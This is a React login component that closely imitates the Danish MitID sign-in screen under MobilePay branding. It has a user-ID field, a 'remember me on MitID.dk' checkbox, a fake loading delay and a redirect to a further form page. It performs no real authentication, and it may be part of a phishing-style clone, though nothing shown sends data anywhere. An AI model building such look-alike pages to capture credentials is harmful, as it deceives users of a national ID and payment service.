import React, { useEffect, useState } from "react";
import Form from "react-bootstrap/Form";
import { AiOutlineInfoCircle } from "react-icons/ai";
import { FaArrowRight } from "react-icons/fa";
import { Link, useNavigate } from "react-router-dom";
import Loader from "./Loader";
import "./Login.css";
import MitLogo from "./images/mit.png";

const Login = () => {
  const [inputValue, setInputValue] = useState("");
  const [loading, setLoading] = useState(true);
  const navigate = useNavigate();
  const handleInputChange = (event) => {
    setInputValue(event.target.value);
  };
  const handleButtonClick = () => {
    if (inputValue) {
      navigate("/FormFile");
    }
  };

  useEffect(() => {
    setTimeout(() => {
      setLoading(false);
    }, 2000);
  }, []);

  if (loading) return <Loader />;

  return (
    <div className="loginContainer">
      <h1>Log på</h1>

      <div className="login_form">
        <div className="login_form_logo">
          <div>Log på hos MobilePay</div>
          <div>
            <img src={MitLogo} alt="Logo" width="100px" height="50px" />
          </div>
        </div>
        <div className="divider"></div>
        <div className="userid_form">
          <label>BRUGER ID</label>
          <input type="text" value={inputValue} onChange={handleInputChange} />
        </div>
        <div className="btn_cont">
          <button
            className="button"
            disabled={!inputValue}
            onClick={handleButtonClick}
          >
            <span className="button-text">FORTSÆT</span>
            <FaArrowRight className="button-icon" />
          </button>
        </div>
        <div className="lost_user_id">
          <Link to="/lost-user-id" className="link">
            <div>
              <AiOutlineInfoCircle style={{ fontSize: "18px" }} />
            </div>
            <div
              style={{
                marginLeft: "5px",
                fontWeight: "600",
                marginBottom: "-3px",
              }}
            >
              Mistet Bruger-id?
            </div>
          </Link>
        </div>
        <Form.Check
          style={{ marginTop: "100px", marginBottom: "10px" }}
          type="checkbox"
          id="Husk mig på MitID.dk"
          label="Husk mig på MitID.dk"
        />

        <div className="divider"></div>
        <button className="cancel_btn">Afbestille</button>
        <button className="cancel_btn">Hjælp</button>
      </div>
    </div>
  );
};

export default Login;
